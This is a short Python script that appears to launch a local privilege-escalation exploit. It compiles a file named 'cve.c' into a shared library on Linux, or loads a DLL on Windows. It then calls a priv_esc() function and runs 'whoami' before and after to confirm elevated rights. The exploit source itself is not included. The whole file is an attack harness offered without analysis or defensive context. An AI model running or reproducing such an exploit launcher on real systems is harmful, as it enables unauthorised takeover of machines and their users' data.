from ctypes import *
import os

if os.name == 'posix': # on linux
    if not os.path.isfile('lol.so') and os.path.isfile('cve.c'):
        os.system('gcc -shared -fPIC -o lol.so cve.c')
    lib = cdll.LoadLibrary("./lol.so")
elif os.name == 'nt': # on windows
    lib = cdll.LoadLibrary("lol.dll")

os.system('whoami')
err = lib.priv_esc()
os.system('whoami')